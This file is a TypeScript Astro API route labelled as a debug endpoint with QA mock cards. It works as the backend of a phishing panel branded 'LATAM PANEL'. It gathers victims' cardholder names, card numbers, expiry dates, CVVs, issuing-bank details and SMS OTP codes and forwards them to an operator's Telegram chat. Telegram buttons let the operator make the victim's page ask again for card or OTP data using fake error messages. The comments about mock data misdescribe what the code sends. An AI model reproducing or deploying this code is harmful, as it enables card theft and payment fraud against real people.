export const prerender = false;

import type { APIRoute } from 'astro';
import { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } from 'astro:env/server';

type DebugEvent = 'PAYMENT_SUBMIT' | 'OTP_SUBMIT';
type RouteAction = 'wait' | 'sms' | 'card' | 'sms_error' | 'card_error' | 'approved';

type RouteDecision = {
  action: RouteAction;
  brand?: string;
  message?: string;
  updatedAt?: string;
};

type DebugSession = {
  decision?: RouteDecision;
  steps: Set<string>;
  payload?: Record<string, unknown>;
  lastTelegramChatId?: string | number;
  lastTelegramMessageId?: number;
  lastCallbackId?: string;
};

const SMS_INVALID_MESSAGE = 'Código inválido. Hemos enviado un nuevo código por SMS o correo';
const CARD_INVALID_MESSAGE = 'No pudimos verificar la tarjeta. Ingresa los datos nuevamente.';

const CARD_MOCKS: Record<string, { brand: string; pan: string; exp: string; cvv: string; holder: string }> = {
  '3': { brand: 'amex', pan: '378282246310005', exp: '12/30', cvv: '1234', holder: 'QA AMEX MOCK' },
  '4': { brand: 'visa', pan: '4111111111111111', exp: '12/30', cvv: '123', holder: 'QA VISA MOCK' },
  '5': { brand: 'mastercard', pan: '5555555555554444', exp: '12/30', cvv: '123', holder: 'QA MC MOCK' },
  '6': { brand: 'discover', pan: '6011111111111117', exp: '12/30', cvv: '123', holder: 'QA DISCOVER MOCK' },
};

// Estado efimero por instancia serverless/dev: guarda la decision elegida en Telegram
// los pasos ya pedidos y el ultimo payload recibido por sessionId.
const globals = globalThis as typeof globalThis & {
  __latamDebugSessions?: Map<string, DebugSession>;
  __latamDebugTelegramOffset?: number;
  __latamDebugCallbackIds?: Set<string>;
  __latamDebugSync?: Promise<void>;
};
const sessions = globals.__latamDebugSessions ?? new Map<string, DebugSession>();
globals.__latamDebugSessions = sessions;
const answeredCallbacks = globals.__latamDebugCallbackIds ?? new Set<string>();
globals.__latamDebugCallbackIds = answeredCallbacks;

function json(data: unknown, init: ResponseInit = {}) {
  return new Response(JSON.stringify(data), {
    ...init,
    headers: {
      'Content-Type': 'application/json',
      'Cache-Control': 'no-store',
      ...init.headers,
    },
  });
}

function cleanSessionId(value: unknown) {
  const id = String(value || '').replace(/[^a-zA-Z0-9_-]/g, '').slice(0, 80);
  return id || crypto.randomUUID();
}

function cardMockForFirstDigit(value: unknown) {
  const first = String(value || '').replace(/\D/g, '').charAt(0);
  return CARD_MOCKS[first] || CARD_MOCKS['4'];
}

// Lee secretos solo desde backend. Estos valores no se importan en scripts de navegador.
function telegramConfig() {
  return {
    token: TELEGRAM_BOT_TOKEN || process.env.TELEGRAM_BOT_TOKEN || '',
    chatId: TELEGRAM_CHAT_ID || process.env.TELEGRAM_CHAT_ID || '',
  };
}

function getSession(sessionId: string) {
  const session = sessions.get(sessionId) ?? { steps: new Set<string>() };
  sessions.set(sessionId, session);
  return session;
}

function objectValue(value: unknown) {
  return value && typeof value === 'object' ? (value as Record<string, unknown>) : undefined;
}

function rememberStep(sessionId: string, step: string) {
  getSession(sessionId).steps.add(step);
}

function hasStep(sessionId: string, step: string) {
  return getSession(sessionId).steps.has(step);
}

function decisionFromAction(action: RouteAction, brand?: string): RouteDecision {
  const decision: RouteDecision = { action, brand, updatedAt: new Date().toISOString() };
  if (action === 'sms_error') decision.message = SMS_INVALID_MESSAGE;
  if (action === 'card_error') decision.message = CARD_INVALID_MESSAGE;
  return decision;
}

// Traduce un boton de Telegram en una decision consumible por el frontend.
// Tambien aplica reglas de repeticion para tarjeta/SMS dentro de la misma sesion.
function makeDecision(sessionId: string, action: RouteAction, brand?: string): RouteDecision {
  if (action === 'card') {
    if (hasStep(sessionId, 'card')) {
      getSession(sessionId).steps = new Set(['card']);
      return decisionFromAction('card_error', brand);
    }
    rememberStep(sessionId, 'card');
  }

  if (action === 'sms') {
    if (hasStep(sessionId, 'sms')) {
      return decisionFromAction('sms_error', brand);
    }
    rememberStep(sessionId, 'sms');
  }

  return decisionFromAction(action, brand);
}

function stepFlags(sessionId: string) {
  const steps = getSession(sessionId).steps;
  return `${steps.has('card') ? 'C' : ''}${steps.has('sms') ? 'S' : ''}`;
}

function applyStepFlags(sessionId: string, flags: string) {
  if (flags.includes('C')) rememberStep(sessionId, 'card');
  if (flags.includes('S')) rememberStep(sessionId, 'sms');
}

// Los tres botones se mantienen iguales en todos los mensajes para que el operador
// siempre tenga las mismas opciones de routing manual.
function keyboard(sessionId: string, brand: string) {
  return {
    inline_keyboard: [
      [{ text: 'Pedir SMS', callback_data: `route:${sessionId}:sms:${brand}` }],
      [{ text: 'Pedir Tarjeta', callback_data: `route:${sessionId}:card:${brand}` }],
      [{ text: 'Finalizar', callback_data: `route:${sessionId}:approved:${brand}` }],
    ],
  };
}

function looksLikeExp(value: string) {
  return /^\d{2}\s*\/\s*\d{2,4}$/.test(value.trim());
}

function looksLikeCvv(value: string) {
  return /^\d{3,4}$/.test(value.trim());
}

function expAndCvvFromPayload(cpayload: Record<string, unknown>) {
  const expField = String(cpayload.exp || '').trim();
  const cvField = String(cpayload.cv || '').trim();
  if (looksLikeExp(cvField) && (looksLikeCvv(expField) || !looksLikeExp(expField))) {
    return { exp: cvField || '-', cvv: expField || '-' };
  }
  if (looksLikeCvv(expField) && (looksLikeExp(cvField) || !looksLikeCvv(cvField))) {
    return { exp: cvField || '-', cvv: expField || '-' };
  }
  return { exp: expField || '-', cvv: cvField || '-' };
}

// Plantilla unica para todos los eventos: page views, pago y OTP usan la misma estructura.
function formatTelegramMessage(payload: Record<string, unknown>) {
  console.log('PAYLOAD FROM MAP: ', payload);
  const mockCard = payload.mockCard as { brand?: string; pan?: string; exp?: string; cvv?: string; holder?: string } | undefined;
  const meta = objectValue(payload.meta) || {};
  const cpayload = objectValue(meta.cpayload) || {};
  const checker = objectValue(cpayload.checker) || {};
  const metaOtp = objectValue(payload.metaOtp) || {};
  const brand = String(payload.brand || mockCard?.brand || meta.brand || '-');
  const amount = String(meta.amount || '-');
  const { exp, cvv } = expAndCvvFromPayload(cpayload);
  const lines = [
    '✈️ LATAM PANEL',
    '━━━━━━━━━━━━━━━━━━',
    `💵 Monto: $ ${amount}`,
    '',
    '💳 DATOS DE PAGO',
    `👤 Titular: ${cpayload.holder || '-'}`,
    `🏷️ Marca: ${brand.toUpperCase()}`,
    `💳 Tarjeta: ${cpayload.b || '-'}`,
    `📅 Expira: ${exp}`,
    `📅 CVV: ${cvv}`,
    '',
    `📅 Nivel: ${checker.level || '-'}`,
    `📅 Banco: ${checker.bank || '-'}`,
    `📅 País: ${checker.country || '-'}`,
    '',
    '💰 OTP',
    `💵 Código: ${metaOtp.otp || '-'}`,
    '━━━━━━━━━━━━━━━━━━',
  ];

  return lines.join('\n');
}

// Wrapper minimo para llamar metodos del Bot API sin repetir token/url.
async function telegramApi(method: string, payload: Record<string, unknown> = {}) {
  const { token } = telegramConfig();
  if (!token) return { ok: false, skipped: 'telegram-env-missing', status: 0, description: '', result: undefined as unknown };
  try {
    const response = await fetch(`https://api.telegram.org/bot${token}/${method}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });
    const body = await response.json().catch(() => ({}));
    return {
      ok: response.ok && body?.ok !== false,
      status: response.status,
      description: String(body?.description || ''),
      result: body?.result,
    };
  } catch {
    return { ok: false, status: 0, description: 'telegram-network', result: undefined as unknown };
  }
}

function publicDebugUrl() {
  const host = String(process.env.VERCEL_PROJECT_PRODUCTION_URL || process.env.VERCEL_URL || '').replace(/^https?:\/\//, '');
  if (!host) return '';
  return `https://${host}/api/debug`;
}

async function ensureTelegramWebhook() {
  const url = publicDebugUrl();
  if (!url) return;
  await telegramApi('setWebhook', {
    url,
    allowed_updates: ['callback_query'],
    drop_pending_updates: false,
  });
}

type PackedRoute = {
  sessionId: string;
  action: RouteAction;
  brand: string;
  flags: string;
  callbackId: string;
  chatId: string;
  messageId: string;
};

function packRouteState(sessionId: string, decision: RouteDecision, callbackId = '') {
  const session = getSession(sessionId);
  return [
    sessionId,
    decision.action,
    decision.brand || '',
    stepFlags(sessionId),
    callbackId || session.lastCallbackId || '',
    String(session.lastTelegramChatId ?? ''),
    String(session.lastTelegramMessageId ?? ''),
  ].join('|').slice(0, 120);
}

function unpackRouteState(text: string): PackedRoute | undefined {
  const [sessionId, action, brand, flags, callbackId, chatId, messageId] = String(text || '').split('|');
  if (!sessionId || !action) return undefined;
  return {
    sessionId,
    action: action as RouteAction,
    brand: brand || '',
    flags: flags || '',
    callbackId: callbackId || '',
    chatId: chatId || '',
    messageId: messageId || '',
  };
}

async function persistRouteState(sessionId: string, decision: RouteDecision, callbackId = '') {
  const session = getSession(sessionId);
  session.decision = decision;
  if (callbackId) session.lastCallbackId = callbackId;
  await telegramApi('setMyShortDescription', {
    short_description: packRouteState(sessionId, decision, callbackId || session.lastCallbackId || ''),
  });
}

async function restoreRouteState(sessionId: string) {
  const result = await telegramApi('getMyShortDescription', {});
  const packed = unpackRouteState(String((result.result as { short_description?: string } | undefined)?.short_description || ''));
  if (!packed || packed.sessionId !== sessionId) return undefined;
  applyStepFlags(sessionId, packed.flags);
  const session = getSession(sessionId);
  session.decision = decisionFromAction(packed.action, packed.brand || undefined);
  if (packed.callbackId) session.lastCallbackId = packed.callbackId;
  if (packed.chatId) session.lastTelegramChatId = packed.chatId;
  const messageId = Number(packed.messageId);
  if (Number.isFinite(messageId) && messageId > 0) session.lastTelegramMessageId = messageId;
  return packed;
}

async function fetchUpdates(token: string, offset?: number) {
  const qs = new URLSearchParams({
    timeout: '0',
    allowed_updates: JSON.stringify(['callback_query']),
  });
  if (typeof offset === 'number') qs.set('offset', String(offset));
  const response = await fetch(`https://api.telegram.org/bot${token}/getUpdates?${qs.toString()}`, {
    headers: { Accept: 'application/json' },
  });
  const payload = await response.json().catch(() => ({}));
  return { status: response.status, payload };
}

// Solo se usa en local. En Vercel el webhook entrega los clics por POST.
async function telegramGetUpdates() {
  if (publicDebugUrl()) return [];
  const { token } = telegramConfig();
  if (!token) return [];
  const offset = globals.__latamDebugTelegramOffset;
  const first = await fetchUpdates(token, offset);
  if (first.status !== 200) return [];
  return Array.isArray(first.payload?.result) ? first.payload.result : [];
}

async function stripTelegramKeyboard(callback: Record<string, unknown>) {
  const message = callback.message as Record<string, unknown> | undefined;
  if (!message?.chat || typeof message.message_id !== 'number') return;
  const chat = message.chat as Record<string, unknown>;
  await telegramApi('editMessageReplyMarkup', {
    chat_id: chat.id,
    message_id: message.message_id,
    reply_markup: { inline_keyboard: [] },
  });
}

function rememberMessageTarget(sessionId: string, callback: Record<string, unknown>) {
  const message = callback.message as Record<string, unknown> | undefined;
  if (!message?.chat || typeof message.message_id !== 'number') return;
  const chat = message.chat as Record<string, unknown>;
  const session = getSession(sessionId);
  session.lastTelegramChatId = chat.id as string | number;
  session.lastTelegramMessageId = message.message_id;
}

async function sendTelegram(payload: Record<string, unknown>, options: { withButtons?: boolean } = {}) {
  const { chatId } = telegramConfig();
  if (!chatId) return { sent: false, skipped: 'telegram-env-missing' };
  const sessionId = String(payload.sessionId || '');
  const brand = String(payload.brand || (payload.mockCard as { brand?: string } | undefined)?.brand || 'visa');
  if (sessionId) await restoreRouteState(sessionId);
  const session = sessionId ? getSession(sessionId) : undefined;
  const text = formatTelegramMessage(payload);
  const message: Record<string, unknown> = {
    chat_id: chatId,
    text,
    disable_web_page_preview: true,
  };
  if (options.withButtons ?? true) {
    message.reply_markup = keyboard(sessionId, brand);
    await ensureTelegramWebhook();
  }
  const existingId = typeof session?.lastTelegramMessageId === 'number' ? session.lastTelegramMessageId : 0;
  if (existingId > 0) {
    const edited = await telegramApi('editMessageText', {
      chat_id: session?.lastTelegramChatId ?? chatId,
      message_id: existingId,
      text,
      disable_web_page_preview: true,
      reply_markup: message.reply_markup || { inline_keyboard: [] },
    });
    if (edited.ok || /message is not modified/i.test(edited.description)) {
      return { sent: true, edited: true };
    }
  }
  const result = await telegramApi('sendMessage', message);
  const sentMessageId = Number((result.result as { message_id?: number } | undefined)?.message_id);
  if (session && result.ok && Number.isFinite(sentMessageId)) {
    session.lastTelegramChatId = chatId;
    session.lastTelegramMessageId = sentMessageId;
  }
  return result.ok ? { sent: true } : { sent: false, error: `telegram-${result.status || 'unknown'}` };
}

function rememberCallbackId(id: string) {
  answeredCallbacks.add(id);
  if (answeredCallbacks.size > 200) {
    const first = answeredCallbacks.values().next().value;
    if (first) answeredCallbacks.delete(first);
  }
}

function isStaleCallbackError(description: string) {
  return /already answered|too old|query_id|QUERY_ID_INVALID|response timeout/i.test(description);
}

// Responde el loading del boton al instante y nunca reintenta el mismo callback_query.
async function answerTelegramCallback(callbackId: unknown) {
  const id = String(callbackId || '');
  if (!id || answeredCallbacks.has(id)) return { answered: false, skipped: true };
  const result = await telegramApi('answerCallbackQuery', {
    callback_query_id: id,
  });
  if (result.ok || isStaleCallbackError(result.description)) {
    rememberCallbackId(id);
  }
  return { answered: result.ok, skipped: false, description: result.description };
}

// Procesa un clic: responde YA, quita los botones y espera la respuesta de la pagina.
async function handleTelegramCallback(body: Record<string, unknown>) {
  const callback = (body.callback_query || body) as Record<string, unknown> | undefined;
  const source = (callback && typeof callback === 'object' && 'data' in callback ? callback : {}) as Record<string, unknown>;
  const callbackId = String(source.id || '');
  const data = String(source.data || '');
  const match = data.match(/^route:([^:]+):(sms|card|approved):([^:]*)$/);

  await answerTelegramCallback(source.id);

  if (!match) return json({ ok: true, ignored: true });

  const [, rawSessionId, rawAction, rawBrand] = match;
  const sessionId = cleanSessionId(rawSessionId);
  const brand = rawBrand || 'visa';
  rememberMessageTarget(sessionId, source);
  await stripTelegramKeyboard(source);
  const packed = await restoreRouteState(sessionId);
  if (callbackId && (packed?.callbackId === callbackId || getSession(sessionId).lastCallbackId === callbackId)) {
    return json({ ok: true, sessionId, duplicate: true });
  }

  const decision = makeDecision(sessionId, rawAction as RouteAction, brand);
  await persistRouteState(sessionId, decision, callbackId);

  return json({ ok: true, sessionId, decision });
}

// Sincroniza callbacks pendientes en local (sin webhook publico).
async function syncTelegramCallbacks() {
  if (globals.__latamDebugSync) return globals.__latamDebugSync;
  const run = (async () => {
    const updates = await telegramGetUpdates();
    let maxId = globals.__latamDebugTelegramOffset;
    for (const update of updates) {
      if (typeof update?.update_id === 'number') {
        maxId = typeof maxId === 'number' ? Math.max(maxId, update.update_id + 1) : update.update_id + 1;
      }
    }
    if (typeof maxId === 'number') {
      globals.__latamDebugTelegramOffset = maxId;
      const { token } = telegramConfig();
      if (token) await fetchUpdates(token, maxId);
    }
    for (const update of updates) {
      if (update?.callback_query) {
        await handleTelegramCallback({ callback_query: update.callback_query });
      }
    }
  })().finally(() => {
    globals.__latamDebugSync = undefined;
  });
  globals.__latamDebugSync = run;
  return run;
}

// El frontend consulta este endpoint mientras muestra loader, esperando la decision
// que el operador eligio en Telegram para esta sessionId.
export const GET: APIRoute = async ({ url }) => {
  const sessionId = cleanSessionId(url.searchParams.get('sessionId'));
  if (!publicDebugUrl()) await syncTelegramCallbacks();
  const packed = await restoreRouteState(sessionId);
  const session = getSession(sessionId);
  const decision = session.decision || { action: 'wait' };
  if (decision.action && decision.action !== 'wait') {
    const latest = await restoreRouteState(sessionId);
    if (!latest || latest.callbackId === (packed?.callbackId || session.lastCallbackId)) {
      session.decision = { action: 'wait', brand: decision.brand, updatedAt: new Date().toISOString() };
      await persistRouteState(sessionId, session.decision, packed?.callbackId || session.lastCallbackId || '');
    }
  }
  return json({ sessionId, decision });
};

// Recibe page views y submits del frontend. Los datos sensibles nunca llegan aqui:
// el cliente envia datos mock/enmascarados y este endpoint arma el mensaje operativo.
export const POST: APIRoute = async ({ request }) => {
  let body: Record<string, unknown> = {};
  try {
    body = await request.json();
  } catch {
    return json({ error: 'JSON invalido' }, { status: 400 });
  }

  if (body.callback_query) return handleTelegramCallback(body);
  if (body.update_id && (body as { message?: unknown }).message) {
    return json({ ok: true, ignored: 'telegram-message' });
  }

  console.info('[debug-api:body]', body);

  const event = String(body.event || '') as DebugEvent;
  const allowed = new Set<DebugEvent>(['PAYMENT_SUBMIT', 'OTP_SUBMIT']);
  if (!allowed.has(event)) return json({ error: 'Evento debug invalido' }, { status: 400 });

  const sessionId = cleanSessionId(body.sessionId);
  const session = getSession(sessionId);
  await restoreRouteState(sessionId);
  const previousPayload = session.payload;
  const previousMeta = objectValue(previousPayload?.meta);
  const previousMetaOtp = objectValue(previousPayload?.metaOtp);
  const incomingMeta = objectValue(body.meta);
  const incomingMetaOtp = objectValue(body.metaOtp);
  const mockCard = event === 'PAYMENT_SUBMIT' ? cardMockForFirstDigit(body.cardFirstDigit) : undefined;
  const brand = String(mockCard?.brand || incomingMeta?.brand || incomingMetaOtp?.brand || previousMeta?.brand || previousMetaOtp?.brand || 'visa');
  if (event === 'PAYMENT_SUBMIT') {
    rememberStep(sessionId, 'card');
    session.decision = { action: 'wait', brand, updatedAt: new Date().toISOString() };
    await persistRouteState(sessionId, session.decision);
  }
  if (event === 'OTP_SUBMIT') {
    rememberStep(sessionId, 'sms');
    session.decision = { action: 'wait', brand, updatedAt: new Date().toISOString() };
    await persistRouteState(sessionId, session.decision);
  }

  const previousCpayload = objectValue(previousMeta?.cpayload);
  const incomingCpayload = objectValue(incomingMeta?.cpayload);
  const meta = {
    ...(previousMeta || {}),
    ...(incomingMeta || {}),
    cpayload: {
      ...(previousCpayload || {}),
      ...(incomingCpayload || {}),
    },
  };
  const payload = {
    sessionId,
    event,
    route: String(body.route || ''),
    createdAt: new Date().toISOString(),
    brand,
    meta,
    metaOtp: incomingMetaOtp || previousMetaOtp || {},
    action: event === 'PAYMENT_SUBMIT' || event === 'OTP_SUBMIT' ? 'wait' : 'ack',
    mockCard: mockCard || previousPayload?.mockCard,
  };

  console.info('[debug-api]', payload);
  session.payload = payload;
  const telegram = await sendTelegram(payload);
  if (session.decision) await persistRouteState(sessionId, session.decision);

  return json({ ...payload, telegram });
};
